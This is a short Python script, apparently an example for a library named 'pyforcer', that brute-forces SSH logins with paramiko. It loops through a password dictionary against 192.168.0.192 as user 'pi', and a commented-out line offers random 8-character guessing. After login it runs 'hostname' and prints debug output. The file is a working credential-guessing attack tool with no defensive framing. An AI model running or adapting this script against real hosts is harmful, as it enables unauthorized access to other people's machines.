from sys import path
path.append('.')

from paramiko import SSHClient

from pyforcer import SSHAuthentication, GuessPasswordBy

client = SSHClient()

ssh_auth = SSHAuthentication(client, known_hosts_path='C:\\Users\\JuDEV\\.ssh\\known_hosts')

def try_to_login() -> None:  
    # password = GuessPasswordBy().random_password(length=8)
    
    for password in GuessPasswordBy().dictionary():
        ssh_auth.login(hostname='192.168.0.192', username='pi', password=password)
    
    stdin, stdout, stderr = client.exec_command('hostname')
    
    ssh_auth.debug_info(stdout, stderr)
        
    stdin.close()
    stdout.close()
    stderr.close() 
    
try_to_login()

client.close()